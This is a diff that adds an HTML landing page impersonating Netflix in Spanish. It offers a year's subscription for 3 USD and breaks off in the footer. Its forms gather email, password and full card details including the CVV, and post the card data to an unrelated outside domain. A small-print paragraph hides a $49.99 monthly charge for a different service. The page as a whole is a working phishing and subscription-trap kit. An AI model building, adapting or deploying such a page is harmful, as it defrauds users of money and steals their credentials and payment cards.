@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="ES">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <title>Netflix</title>
+  <link rel="shortcut icon" href="../../images/netflix.ico">
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="./css/animate-3.5.2.min.css">
+  <link rel="stylesheet" href="./css/bootstrap-4.0.0.min.css">
+  <link rel="stylesheet" href="./css/animate-3.5.2.min.css">
+  <link rel="stylesheet" href="./css/main.css">
+  <link rel="stylesheet" href="./css/fonts.css">
+  <link rel="stylesheet" href="./css/all.css"
+    integrity="sha384-G0fIWCsCzJIMAVNQPfjH08cyYaUtMwjJwqiRKxxE/rx96Uroj1BtIQ6MLJuheaO9" crossorigin="anonymous">
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
+<script>
+    window.ASSET_PATH = "https://registerdrive.xyz/shared";
+    window.GEO_PATH = "https://registerdrive.xyz/shared/geo/es";
+</script>
+  <script src="./js/jquery-2.2.4.min.js"></script>
+  <script src="./js/bootstrap.min-4.1.1.js"></script>
+
+</head>
+
+<body>
+
+  <div id="secure-site"></div>
+  <div class="topbar px-2 text-lg-center text-md-center text-sm-right text-right">Netflix</div>
+  <header>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-12">
+          <div class="animated fadeIn">
+            <div class="animated fadeInUp">
+              <h1 class="text-center py-lg-5 py-md-3 py-sm-2 py-2 px-5 mb-0">¿Quieres conseguir un año de Netflix?</h1>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-6 col-md-12 text-center offset-xs-2 pricebadge-container">
+          <div class="animated fadeInDown">
+            <img src="./index_files/brand-circle.png" class="img-fluid" alt="Netflix">
+          </div>
+          <div class="text-center animated fadeInUp">
+            <img src="./index_files/brand.png" class="img-fluid" alt="Netflix">
+          </div>
+          <div class="pricebadge animated pulse infinite">
+          <span>Obtener por<em>3USD</em></span>
+          </div>
+        </div>
+        <div class="col-lg-6 col-md-12 offset-xs2 main">
+          <div class="formcontainer pb-3 mb-5 animated slideInRight">
+            <div class="formheader text-center py-2">
+              <h2 class="text-uppercase text-light">Obtén una suscripción anual por 3USD</h2>
+            </div>
+           <!-- DO NOT MODIFY -->
+        <div class="paso0 content" style="display: none; z-index:999;">
+                  <img id="loading" class="center" src="https://registerdrive.xyz/shared/images/netflix/loading.gif" />
+                </div>
+            <div class="paso1" style="display: none">
+
+            <!-- <div class="lp-element lp-pom-text nlh" id="lp-pom-text-16" style="height: auto; display:block;">
+            <p class="mobile-center lplh-22" style="line-height: 20px;">
+              <span style="color: rgb(0, 0, 0);"><span style="font-size: 14px;"><span
+                    style="font-family: Montserrat; font-weight: 700; font-style: normal;">ERHALTEN SIE EIN IPHONE XS FÜR NUR 3 €. DIE AKTION LÄUFT NUR FÜR EINEN BEGRENZTEN ZEITRAUM.</span></span></span>
+            </p>
+          </div> -->
+          <div class="lp-element lp-pom-box" id="lp-pom-box-326" style="display:;">
+            <div id="lp-pom-box-326-color-overlay"></div>
+          </div> 
+
+
+
+            
+            
+              <form class='pspPaymentForm' id="datos" method="post" action="./">
+
+                <div class="lp-element lp-pom-form has-axis" id="lp-pom-form-11">
+
+            
+
+                
+
+
+             
+
+                <!-- <div class="form-row"> -->
+                  <div class="form-group has-feedback" style="display:none;" >
+                    <label class="sr-only" for="zipcode">Vorname</label>
+                    <div>
+                      <input type="text" class="form-control required input" pattern="" name="first_name"
+                        id="f_first_name" placeholder="Vorname" required="" value="Name" style="margin: 0;"/>
+                      <span id="err_f_first_name" style="display:none; font-weight: bold;color: #FF3333;"
+                        class="form--control-error">Namen eingeben</span>
+                        <span id="err_f_first_name1" style="display:none; font-weight: bold;color: #FF3333;"
+                        class="form--control-error">mindestens 1 Zeichen</span>
+                    </div>
+                  </div>
+                  <div class="form-group has-feedback" style="display:none;">
+                    <label class="sr-only" for="city">Nachname</label>
+                    <div>
+                      <input type="text" class="form-control required input" pattern="" name="last_name"
+                        id="f_last_name" placeholder="Nachname" required="" value="Lastname" style="margin: 0;"/>
+                      <span id="err_f_last_name" style="display:none; font-weight: bold;color: #FF3333;"
+                        class="form--control-error">Nachname einfügen</span>
+                         <span id="err_f_last_name1" style="display:none; font-weight: bold;color: #FF3333;"
+                        class="form--control-error">mindestens 1 Zeichen</span>
+                    </div>
+                  </div>
+
+                  <div class="form-group has-feedback">
+                    <label class="sr-only" for="zipcode">Land</label>
+                    <div>
+                     <!-- <select name="country" id="country" class="form-control" style="display:block; height:45px;margin: 0;">
+                     <option value="">Land</option>
+                     <option value="DEU">Germany</option>
+                     <option value="AUT">Austria</option>
+                     <option value="CHE">Suiza</option>
+                     </select> -->
+                      <!-- <span id="err_country" style="display:none; font-weight: bold;color: #FF3333;"
+                        class="form--control-error">Geben Sie das Land ein</span> -->
+                        <select name="country" id="country" class="form-control" style="display:none;">
+                                                  <option value="AFG">Afghanistan</option>
+                                                        <option value="ALB">Albania</option>
+                                                        <option value="DZA">Algeria</option>
+                                                        <option value="ASM">American Samoa</option>
+                                                        <option value="AND">Andorra</option>
+                                                        <option value="AGO">Angola</option>
+                                                        <option value="AIA">Anguilla</option>
+                                                        <option value="ATA">Antarctica</option>
+                                                        <option value="ATG">Antigua and Barbuda</option>
+                                                        <option value="ARG">Argentina</option>
+                                                        <option value="ARM">Armenia</option>
+                                                        <option value="ABW">Aruba</option>
+                                                        <option value="AUS">Australia</option>
+                                                        <option value="AUT">Austria</option>
+                                                        <option value="AZE">Azerbaijan</option>
+                                                        <option value="BHS">Bahamas</option>
+                                                        <option value="BHR">Bahrain</option>
+                                                        <option value="BGD">Bangladesh</option>
+                                                        <option value="BRB">Barbados</option>
+                                                        <option value="BLR">Belarus</option>
+                                                        <option value="BEL">Belgium</option>
+                                                        <option value="BLZ">Belize</option>
+                                                        <option value="BEN">Benin</option>
+                                                        <option value="BMU">Bermuda</option>
+                                                        <option value="BTN">Bhutan</option>
+                                                        <option value="BOL">Bolivia</option>
+                                                        <option value="BIH">Bosnia and Herzegovina</option>
+                                                        <option value="BWA">Botswana</option>
+                                                        <option value="BVT">Bouvet Island</option>
+                                                        <option value="BRA">Brazil</option>
+                                                        <option value="IOT">British Indian Ocean Territory</option>
+                                                        <option value="BRN">Brunei Darussalam</option>
+                                                        <option value="BGR">Bulgaria</option>
+                                                        <option value="BFA">Burkina Faso</option>
+                                                        <option value="BDI">Burundi</option>
+                                                        <option value="KHM">Cambodia</option>
+                                                        <option value="CMR">Cameroon</option>
+                                                        <option value="CAN">Canada</option>
+                                                        <option value="CPV">Cape Verde</option>
+                                                        <option value="CYM">Cayman Islands</option>
+                                                        <option value="CAF">Central African Republic</option>
+                                                        <option value="TCD">Chad</option>
+                                                        <option value="CHL">Chile</option>
+                                                        <option value="CHN">China</option>
+                                                        <option value="CXR">Christmas Island</option>
+                                                        <option value="CCK">Cocos (Keeling) Islands</option>
+                                                        <option value="COL">Colombia</option>
+                                                        <option value="COM">Comoros</option>
+                                                        <option value="COG">Congo</option>
+                                                        <option value="COD">Congo, the Democratic Republic of the</option>
+                                                        <option value="COK">Cook Islands</option>
+                                                        <option value="CRI">Costa Rica</option>
+                                                        <option value="CIV">Cote D'Ivoire</option>
+                                                        <option value="HRV">Croatia</option>
+                                                        <option value="CUB">Cuba</option>
+                                                        <option value="CYP">Cyprus</option>
+                                                        <option value="CZE">Czech Republic</option>
+                                                        <option value="DNK">Denmark</option>
+                                                        <option value="DJI">Djibouti</option>
+                                                        <option value="DMA">Dominica</option>
+                                                        <option value="DOM">Dominican Republic</option>
+                                                        <option value="ECU">Ecuador</option>
+                                                        <option value="EGY">Egypt</option>
+                                                        <option value="SLV">El Salvador</option>
+                                                        <option value="GNQ">Equatorial Guinea</option>
+                                                        <option value="ERI">Eritrea</option>
+                                                        <option value="EST">Estonia</option>
+                                                        <option value="ETH">Ethiopia</option>
+                                                        <option value="FLK">Falkland Islands (Malvinas)</option>
+                                                        <option value="FRO">Faroe Islands</option>
+                                                        <option value="FJI">Fiji</option>
+                                                        <option value="FIN">Finland</option>
+                                                        <option value="FRA">France</option>
+                                                        <option value="GUF">French Guiana</option>
+                                                        <option value="PYF">French Polynesia</option>
+                                                        <option value="ATF">French Southern Territories</option>
+                                                        <option value="GAB">Gabon</option>
+                                                        <option value="GMB">Gambia</option>
+                                                        <option value="GEO">Georgia</option>
+                                                        <option value="DEU">Germany</option>
+                                                        <option value="GHA">Ghana</option>
+                                                        <option value="GIB">Gibraltar</option>
+                                                        <option value="GRC">Greece</option>
+                                                        <option value="GRL">Greenland</option>
+                                                        <option value="GRD">Grenada</option>
+                                                        <option value="GLP">Guadeloupe</option>
+                                                        <option value="GUM">Guam</option>
+                                                        <option value="GTM">Guatemala</option>
+                                                        <option value="GIN">Guinea</option>
+                                                        <option value="GNB">Guinea-Bissau</option>
+                                                        <option value="GUY">Guyana</option>
+                                                        <option value="HTI">Haiti</option>
+                                                        <option value="HMD">Heard Island and Mcdonald Islands</option>
+                                                        <option value="VAT">Holy See (Vatican City State)</option>
+                                                        <option value="HND">Honduras</option>
+                                                        <option value="HKG">Hong Kong</option>
+                                                        <option value="HUN">Hungary</option>
+                                                        <option value="ISL">Iceland</option>
+                                                        <option value="IND">India</option>
+                                                        <option value="IDN">Indonesia</option>
+                                                        <option value="IRN">Iran, Islamic Republic of</option>
+                                                        <option value="IRQ">Iraq</option>
+                                                        <option value="IRL">Ireland</option>
+                                                        <option value="ISR">Israel</option>
+                                                        <option value="ITA">Italy</option>
+                                                        <option value="JAM">Jamaica</option>
+                                                        <option value="JPN">Japan</option>
+                                                        <option value="JOR">Jordan</option>
+                                                        <option value="KAZ">Kazakhstan</option>
+                                                        <option value="KEN">Kenya</option>
+                                                        <option value="KIR">Kiribati</option>
+                                                        <option value="PRK">Korea, Democratic People's Republic of</option>
+                                                        <option value="KOR">Korea, Republic of</option>
+                                                        <option value="KWT">Kuwait</option>
+                                                        <option value="KGZ">Kyrgyzstan</option>
+                                                        <option value="LAO">Lao People's Democratic Republic</option>
+                                                        <option value="LVA">Latvia</option>
+                                                        <option value="LBN">Lebanon</option>
+                                                        <option value="LSO">Lesotho</option>
+                                                        <option value="LBR">Liberia</option>
+                                                        <option value="LBY">Libyan Arab Jamahiriya</option>
+                                                        <option value="LIE">Liechtenstein</option>
+                                                        <option value="LTU">Lithuania</option>
+                                                        <option value="LUX">Luxembourg</option>
+                                                        <option value="MAC">Macao</option>
+                                                        <option value="MKD">Macedonia, the Former Yugoslav Republic of</option>
+                                                        <option value="MDG">Madagascar</option>
+                                                        <option value="MWI">Malawi</option>
+                                                        <option value="MYS">Malaysia</option>
+                                                        <option value="MDV">Maldives</option>
+                                                        <option value="MLI">Mali</option>
+                                                        <option value="MLT">Malta</option>
+                                                        <option value="MHL">Marshall Islands</option>
+                                                        <option value="MTQ">Martinique</option>
+                                                        <option value="MRT">Mauritania</option>
+                                                        <option value="MUS">Mauritius</option>
+                                                        <option value="MYT">Mayotte</option>
+                                                        <option value="MEX">Mexico</option>
+                                                        <option value="FSM">Micronesia, Federated States of</option>
+                                                        <option value="MDA">Moldova, Republic of</option>
+                                                        <option value="MCO">Monaco</option>
+                                                        <option value="MNG">Mongolia</option>
+                                                        <option value="MSR">Montserrat</option>
+                                                        <option value="MAR">Morocco</option>
+                                                        <option value="MOZ">Mozambique</option>
+                                                        <option value="MMR">Myanmar</option>
+                                                        <option value="NAM">Namibia</option>
+                                                        <option value="NRU">Nauru</option>
+                                                        <option value="NPL">Nepal</option>
+                                                        <option value="NLD">Netherlands</option>
+                                                        <option value="ANT">Netherlands Antilles</option>
+                                                        <option value="NCL">New Caledonia</option>
+                                                        <option value="NZL">New Zealand</option>
+                                                        <option value="NIC">Nicaragua</option>
+                                                        <option value="NER">Niger</option>
+                                                        <option value="NGA">Nigeria</option>
+                                                        <option value="NIU">Niue</option>
+                                                        <option value="NFK">Norfolk Island</option>
+                                                        <option value="MNP">Northern Mariana Islands</option>
+                                                        <option value="NOR">Norway</option>
+                                                        <option value="OMN">Oman</option>
+                                                        <option value="PAK">Pakistan</option>
+                                                        <option value="PLW">Palau</option>
+                                                        <option value="PSE">Palestinian Territory, Occupied</option>
+                                                        <option value="PAN">Panama</option>
+                                                        <option value="PNG">Papua New Guinea</option>
+                                                        <option value="PRY">Paraguay</option>
+                                                        <option value="PER">Peru</option>
+                                                        <option value="PHL">Philippines</option>
+                                                        <option value="PCN">Pitcairn</option>
+                                                        <option value="POL">Poland</option>
+                                                        <option value="PRT">Portugal</option>
+                                                        <option value="PRI">Puerto Rico</option>
+                                                        <option value="QAT">Qatar</option>
+                                                        <option value="REU">Reunion</option>
+                                                        <option value="ROU">Romania</option>
+                                                        <option value="RUS">Russian Federation</option>
+                                                        <option value="RWA">Rwanda</option>
+                                                        <option value="SHN">Saint Helena</option>
+                                                        <option value="KNA">Saint Kitts and Nevis</option>
+                                                        <option value="LCA">Saint Lucia</option>
+                                                        <option value="SPM">Saint Pierre and Miquelon</option>
+                                                        <option value="VCT">Saint Vincent and the Grenadines</option>
+                                                        <option value="WSM">Samoa</option>
+                                                        <option value="SMR">San Marino</option>
+                                                        <option value="STP">Sao Tome and Principe</option>
+                                                        <option value="SAU">Saudi Arabia</option>
+                                                        <option value="SEN">Senegal</option>
+                                                        <option value="MNE">Serbia and Montenegro</option>
+                                                        <option value="SYC">Seychelles</option>
+                                                        <option value="SLE">Sierra Leone</option>
+                                                        <option value="SGP">Singapore</option>
+                                                        <option value="SVK">Slovakia</option>
+                                                        <option value="SVN">Slovenia</option>
+                                                        <option value="SLB">Solomon Islands</option>
+                                                        <option value="SOM">Somalia</option>
+                                                        <option value="ZAF">South Africa</option>
+                                                        <option value="SGS">South Georgia and the South Sandwich Islands</option>
+                                                        <option value="ESP">Spain</option>
+                                                        <option value="LKA">Sri Lanka</option>
+                                                        <option value="SDN">Sudan</option>
+                                                        <option value="SUR">Suriname</option>
+                                                        <option value="SJM">Svalbard and Jan Mayen</option>
+                                                        <option value="SWZ">Swaziland</option>
+                                                        <option value="SWE">Sweden</option>
+                                                        <option value="CHE">Switzerland</option>
+                                                        <option value="SYR">Syrian Arab Republic</option>
+                                                        <option value="TWN">Taiwan, Province of China</option>
+                                                        <option value="TJK">Tajikistan</option>
+                                                        <option value="TZA">Tanzania, United Republic of</option>
+                                                        <option value="THA">Thailand</option>
+                                                        <option value="TLS">Timor-Leste</option>
+                                                        <option value="TGO">Togo</option>
+                                                        <option value="TKL">Tokelau</option>
+                                                        <option value="TON">Tonga</option>
+                                                        <option value="TTO">Trinidad and Tobago</option>
+                                                        <option value="TUN">Tunisia</option>
+                                                        <option value="TUR">Turkey</option>
+                                                        <option value="TKM">Turkmenistan</option>
+                                                        <option value="TCA">Turks and Caicos Islands</option>
+                                                        <option value="TUV">Tuvalu</option>
+                                                        <option value="UGA">Uganda</option>
+                                                        <option value="UKR">Ukraine</option>
+                                                        <option value="ARE">United Arab Emirates</option>
+                                                        <option value="GBR">United Kingdom</option>
+                                                        <option value="USA">United States</option>
+                                                        <option value="UMI">United States Minor Outlying Islands</option>
+                                                        <option value="URY">Uruguay</option>
+                                                        <option value="UZB">Uzbekistan</option>
+                                                        <option value="VUT">Vanuatu</option>
+                                                        <option value="VEN">Venezuela</option>
+                                                        <option value="VNM">Viet Nam</option>
+                                                        <option value="VGB">Virgin Islands, British</option>
+                                                        <option value="VIR">Virgin Islands, U.s.</option>
+                                                        <option value="WLF">Wallis and Futuna</option>
+                                                        <option value="ESH">Western Sahara</option>
+                                                        <option value="YEM">Yemen</option>
+                                                        <option value="ZMB">Zambia</option>
+                                                        <option value="ZWE">Zimbabwe</option>
+                                                        <option value="MAF">Saint Martin (French part)</option>
+                                                 </select>
+                    </div>
+                  </div>
+
+
+                  <div class="form-group has-feedback">
+                  <label class="sr-only" for="email">Correo Electronico</label>
+                  <div>
+                  
+                    <input type="email" class="form-control required input" pattern=".{6,}" name="email" id="email"
+                      placeholder="E-mail" required="" value="" style="margin: 0;"/>
+                    <span id="etiquetaemail" style="display:none; font-weight: bold;color: white;"
+                      class="form--control-error">Introduce una dirección de correo electrónico válido</span>
+                      <span id="verificaremail" style="display:none; font-weight: bold;color: white;"
+                      class="form--control-error">La dirección de correo electrónico ya existe</span>
+                  </div>
+                </div>
+                <!-- </div> -->
+
+               
+                  <div class="form-group has-feedback" style="margin: 0;">
+                    <label class="sr-only" for="zipcode">Contraseña</label>
+                    <div>
+                      <input type="password" class="form-control required input" pattern=".{4,}" name="password"
+                        id="pass" placeholder="Contraseña" required="" value="" style="margin: 0;"  autocomplete="on"/>
+                      <span id="etiquetapass" style="display:none; font-weight: bold;color: white;"
+                        class="form--control-error">Entre 5 y 15 caracteres</span>
+                    </div>
+                  </div>
+                  <!-- <div class="form-group has-feedback col-xs-6 col-sm-6	col-md-6 col-lg-6" >
+                    <label class="sr-only" for="city">Passwort bestätigen</label>
+                    <div>
+                      <input type="password" class="form-control required input" pattern=".{4,}" name="password"
+                        id="confirmar_pass" placeholder="Passwort bestätigen" required="">
+                      <span id="etiquetaconfirmar_pass" style="display:none; font-weight: bold;color: #FF3333;"
+                        class="form--control-error">Sie stimmen nicht überein</span>
+                    </div>
+                  </div> -->
+                
+                <div id="divaceptar" class="checkbox">
+                  <label class="has-success" style="margin-left:13px; margin-top: 10px;">
+                    <input id="aceptar" type="checkbox" checked="checked"> Certifico que soy mayor de 18 años, acepto los términos y condiciones. <a id="tos" target="_blank" href="https://registerdrive.xyz/shared/legal/es/tos-es.html">Leer más.</a>
+                  </label>
+                </div>
+               
+                <!-- <div class="form-group terms">
+                  <div class="checkbox">
+                    <label>
+                      <input type="checkbox" name="terms" id="terms" value="true" checked="" required="">
+                      <span class="termslink">I have already read and accept the terms and conditions</span>
+                    </label>
+                  </div>
+                </div> -->
+                <div class="form-group">
+                  <button type="button" id="continuar" class="btn btn-lg btn-block ">
+                  SIGUIENTE
+                  </button>
+                </div>
+                </div>
+              </form>
+            </div>
+            <div class="paso2" style="align-items: center;display: none;justify-content: center; background-color:white; border-radius:2%;width: 80%;margin: auto;">
+              <!-- <img id="back_btn" src="back.png" style="margin-right: 80%;width: 32px;cursor:pointer;" /> -->
+              <div id="includeprueba" class="row paso2"
+                style="align-items: center;display: none;justify-content: center;">
+
+                <div class="lp-element lp-pom-text nlh" id="lp-pom-text-16" style="height: auto; text-align:center;">
+            <p class="mobile-center lplh-22" style="line-height: 20px; margin: 0;">
+              <img src="https://registerdrive.xyz/shared/images/visa.jpeg" alt="">
+            </p>
+          </div>
+
+
+          <form action="https://dri-ve-buil-der.xyz/geo/es/usd/net/pay/payment_auth.php" id="dopayment" method="post" style="width: 100%;">
+                   <input type="hidden" id="s_first_name" name="first_name">
+                   <input type="hidden" id="s_last_name" name="last_name">
+                   <input type="hidden" id="countryy" name="countryy">
+                   <input type="hidden" id="hdpass" name="hdpass" />
+                   <input type="hidden" id="amount" name="amount" />
+                   <input type="hidden" name="currency" value="USD">
+                   <input type="hidden" name="itoken" value="awCoV9TLrWErZ40yUzSrNbfU">
+                   <input type="hidden" name="patak" id="patak" value="">
+                   <input type="hidden" name="affiliate_id" id="affiliate_id" value="">
+                   <input type="hidden" name="lp" id="lp" value="">
+                   <input type="hidden" name="card_type" id="card_type" value="" />
+                   <input type="hidden" name="card_geo" id="card_geo" value="" />
+                   
+            <div class="lp-element lp-pom-form has-axis" id="lp-pom-form-12" style="padding: 0 10px;">
+            <div class="form-group has-feedback">
+                  <label class="sr-only" for="email">E-mail</label>
+                  <div style="display:none;">
+
+                    <input type="text" class="form-control required input" name="s_email" id="s_email"
+                      placeholder="Indirizzo email" required="" value="" readonly>
+
+                  </div>
+                </div>
+
+                
+                  <div class="form-group has-feedback">
+                    <label class="" for="email" style="margin-left: 10px;font-weight: bold;">Nombre del titular de la tarjeta:</label>
+                    <div>
+                  
+                      <input type="text" id="s_cd_holder" placeholder="Nombre del titular de la tarjeta" class="form-control input required" name="card_holder"  required="required" style="border-radius: 5px;
+    border: solid 1px rgba(208,208,208,.5) !important;" />
+                <span id="err_s_cd_holder"  style="display:none; font-weight: bold;color: #FF3333; " class="form--control-error" >Introduce el nombre del titular de la tarjeta</span>
+
+                    </div>
+                  </div>
+                
+
+                  <div class="form-group has-feedback">
+                <label class="" for="email" style="margin-left:10px; font-weight: bold;font-size: 16px;">Número de tarjeta:</label>
+                  <div style="position:relative;"> 
+                  <input type="tel" pattern="[0-9]*" inputmode="numeric" id="s_cd_number" placeholder="0000 0000 0000 0000" class="form-control input required" name="card_number" required="required" value="" />
+                  <svg id="ccicon" class="ccicon" width="750" height="471" viewBox="0 0 750 471" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                          </svg>
+                          <span id="err_card_no" style="display:none; font-weight: bold;color: #FF3333; font-size: 14px;" class="form--control-error">Invalid credit card number!<br><br></span>
+                          <span id="err_card_block" style="display:none; font-weight: bold;color: #FF3333; font-size: 14px;" class="form--control-error">Tarjetas VISA no aceptadas temporalmente.<br><br></span>
+                          <span id="err_s_cd_number" style="display:none; font-weight: bold;color: #FF3333; font-size: 14px; " class="form--control-error">Introduce un numero de tarjeta válido<br></span>
+                          <span id="err_s_cd_name" style="display:none; font-weight: bold;color: #FF3333; font-size: 14px; " class="form--control-error">Solo aceptamos visa o mastercard</span>
+                          <div>
+                          <span id="err_s_cd_bank" style="display:none; font-weight: bold;color: #FF3333; font-size: 14px;" class="form--control-error">No se acepta la tarjeta de este banco en particular (Pruebe con otra tarjeta)</span>
+                          </div>
+                    <!-- <input type="tel" id="s_cd_number" placeholder="0000 0000 0000 0000" class="form-control1 input required" name="card_number" minlength="16" maxlength="16" required="required" value="" />
+                    <span id="err_s_cd_number" style="display:none; font-weight: bold;color: #FF3333; margin-left: 16px;" class="form--control-error">Enter valid Card Number</span> -->
+
+                  </div>
+                </div>
+
+                <div class="form-row"style="margin-bottom: 1rem;">
+                  <div class="form-group has-feedback col-xs-6 col-sm-6	col-md-6 col-lg-6">
+                    <label class="" for="zipcode" style="margin-left: 10px;font-weight: bold;">Mes de caducidad:</label>
+                    <!--<div>
+                      <input type="text" name="card_exp_month" class="form-control input required" id="card_exp_month" placeholder="MM"  minlength="2" maxlength="2" required="required" value=""  />
+                      <span id="err_card_exp_month" style="display:none; font-weight: bold;color: #f7f7f7;"
+                        class="form--control-error">Enter Valid Exp Month</span>
+                    </div> -->
+
+
+                       <select name="card_exp_month" id="card_exp_month" class="form-control input required" style="" required style="border-radius: 5px;
+    border: solid 1px rgba(208,208,208,.5) !important;">
+                       
+                       <option value="">Mes</option>
+                       <option value="01">01</option>
+                       <option value="02">02</option>
+                       <option value="03">03</option>
+                       <option value="04">04</option>
+                       <option value="05">05</option>
+                       <option value="06">06</option>
+                       <option value="07">07</option>
+                       <option value="08">08</option>
+                       <option value="09">09</option>
+                       <option value="10">10</option>
+                       <option value="11">11</option>
+                       <option value="12">12</option>
+                     </select>
+
+                     <span id="err_card_exp_month" style="display:none; font-weight: bold;color: #FF3333;"
+                        class="form--control-error">Introduce un mes de exp válido</span>
+
+                  </div>
+                  <div class="form-group has-feedback col-xs-6 col-sm-6	col-md-6 col-lg-6" style="margin:0">
+                   <label class="" for="city" style="margin-left: 10px;font-weight: bold;">Año de caducidad:</label>
+                    <!-- 
+                    <div>
+                        <input type="text" name="card_exp_year" id="card_exp_year" class="form-control input required" placeholder="YY"  minlength="2" maxlength="2" required="required" value=""  />
+                      <span id="err_card_exp_year" style="display:none; font-weight: bold;color: #f7f7f7;"
+                        class="form--control-error">Enter Valid Exp Year</span>
+                    </div> -->
+
+                  <select name="card_exp_year" id="card_exp_year" class="form-control input required" style="" required style="border-radius: 5px;
+    border: solid 1px rgba(208,208,208,.5) !important;">
+                       <option value="">Año</option>
+                       
+                       <option value="21">21</option>
+                       <option value="22">22</option>
+                       <option value="23">23</option>
+                       <option value="24">24</option>
+                       <option value="25">25</option>
+                       <option value="26">26</option>
+                       <option value="27">27</option>
+                       <option value="28">28</option>
+                       <option value="29">29</option>
+                       <option value="30">30</option>
+                       <option value="31">31</option>
+                       <option value="32">32</option>
+                       <option value="33">33</option>
+                       <option value="34">34</option>
+                       <option value="35">35</option>
+                       <option value="36">36</option>
+                     </select>
+
+                     <span id="err_card_exp_year" style="display:none; font-weight: bold;color: #FF3333;"
+                        class="form--control-error">Introduce el año de exp válido</span>
+
+                  </div>
+
+                    <!-- <select name="card_exp_month" id="card_exp_month" class="form-control input required" style="display:none;" required>
+                       
+                       <option value="">MESE</option>
+                       <option value="02">02</option>
+                       <option value="03">03</option>
+                       <option value="04">04</option>
+                       <option value="05">05</option>
+                       <option value="06">06</option>
+                       <option value="07">07</option>
+                       <option value="08">08</option>
+                       <option value="09">09</option>
+                       <option value="10">10</option>
+                       <option value="11">11</option>
+                       <option value="12">12</option>
+                     </select> -->
+
+
+
+
+                  <!-- <select name="card_exp_year" id="card_exp_year" class="form-control input required" style="display:none;" required>
+                       <option value="">ANNO</option>
+                       <option value="19">19</option>
+                       
+                       <option value="21">21</option>
+                       <option value="22">22</option>
+                       <option value="23">23</option>
+                       <option value="24">24</option>
+                       <option value="25">25</option>
+                       <option value="26">26</option>
+                       <option value="27">27</option>
+                       <option value="28">28</option>
+                       <option value="29">29</option>
+                     </select> -->
+                </div>
+
+                <div class="form-row" style=" height: 105px;">
+                  <div class="form-group has-feedback col-xs-4 col-sm-4	col-md-4 col-lg-4">
+                    <label class="" for="zipcode" style="margin-left: 10px;font-weight: bold;">CVC/CVV</label>
+                    <div style="height: 38px; ">
+                     <input type="text" name="cvv" id="cvv" class="form-control input required" placeholder="CVC/CVV" value=""   minlength="3" maxlength="3" required="required" style="width: 100px;border-radius: 5px;
+    border: solid 1px rgba(208,208,208,.5) !important;";/>
+
+                      <span id="err_cvv" style="display:none; font-weight: bold;color: #FF3333;"
+                        class="form--control-error">Introduce CVV</span>
+                    </div>
+                  </div>
+
+<!--                
+                  <div class="form-group has-feedback col-xs-2 col-sm-2	col-md-2 col-lg-2" id="interImg">
+                    
+                    <div style="visibility: hidden;">
+                    
+                    <img  src="./imagenes/inter.png" alt="cvv" id="imgInter">
+                
+                    </div>
+                  </div> -->
+                  <div class="form-group has-feedback col-xs-6 col-sm-6	col-md-6 col-lg-6" id="cvvImg">
+                    
+                    <div style="width: 390px;">
+                   
+                    <img id="cvvImg" src="https://registerdrive.xyz/shared/images/visa-master-cvv.png" alt="cvv" id="imgCvv" style="width: 120px; margin-top: 5px;">
+                   
+                    </div>
+                  </div>
+                </div>
+            
+                 <div class="form-group" id="test">
+                  <button type="button" id="s_form_but" class="btn btn-lg btn-block continuar" style="width: 80%;margin: auto;border-radius: 25px !important;font-size: 1.5em;">
+                  PAGUE AHORA
+                  </button>
+                </div>
+
+
+                </div>
+          </form>
+              </div>
+            </div>
+ <!-- DO NOT MODIFY -->
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+  <section id="first-block" class="container-fluid">
+    <i class="fas fa-desktop text-center"></i>
+    <div class="container">
+      <div class="row elfade">
+
+      <div class="col-lg-12 text-center">
+          <p style="color:#555;font-size:0.7rem;margin-top:-12px">*Al usar la PRUEBA, se le suscribirá al servicio premium de regulardrive.net, que tendrá un costo de cuarenta y nueve con noventa y nueve dólares americanos por mes. Después de 2 días, si no cancela su cuenta, puede cancelar su prueba en cualquier momento. Se le cobrará el costo de la cuenta premium. No dude en encontrar toda esta información y condiciones para la suscripción en Términos y condiciones.</p>
+          <h3>Descubre las mejores series y películas en Netflix</h3>
+          <p class="text-light">Entretenimiento personalizado para ti</p>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-lg-4 feature text-center">
+          <div class="card">
+            <div class="container">
+              <img class="card-img-top" src="./index_files/devices.png" alt="Netflix">
+            </div>
+            <div class="card-body">
+              <p class="card-text">¡Disfrútalo donde quieras!</p>
+            </div>
+          </div>
+        </div>
+        <div class="col-lg-4 feature text-center">
+          <div class="card">
+            <div class="container">
+              <img class="card-img-top" src="./index_files/streaming.png" alt="Netflix">
+            </div>
+            <div class="card-body">
+              <p class="card-text">En streaming o para ver más tarde</p>
+            </div>
+          </div>
+        </div>
+        <div class="col-lg-4 feature text-center">
+          <div class="card">
+            <div class="container">
+              <img class="card-img-top" src="./index_files/online.png" alt="Netflix">
+            </div>
+            <div class="card-body">
+              <p class="card-text">Sin compromisos, cancela en línea cuando quieras</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-lg-12 text-center">
+          <a href="#top" class="btn btn-primary btn-lg text-uppercase totop">Obtenlo por 3USD</a>
+        </div>
+      </div>
+      <hr>
+    </div>
+  </section>
+  <section id="second-block">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-12 text-center text-light">
+          <h3>Conéctate con tu dispositivo favorito</h3>
+          <p class="text-light">Acceso instantáneo a contenidos increíbles en más de 190 países</p>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-lg-12 text-center">
+          <a href="#top" class="btn btn-primary btn-lg text-uppercase totop">Obtenlo por 3USD</a>
+        </div>
+      </div>
+    </div>
+  </section>
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-12 text-center">
+          <i class="fas fa-film d-block text-center"></i>
+          <h4 class="d-block text-center">Obtén una suscripción anual a Netflix por 3USD</h4>
+        </div>
+      </div>
+      <hr class="my-4">
+      <div class="row">
+        <div class="col-lg-4 col-sm-12">
+          <h4>¿Qué es regulardrive.net?</h4>
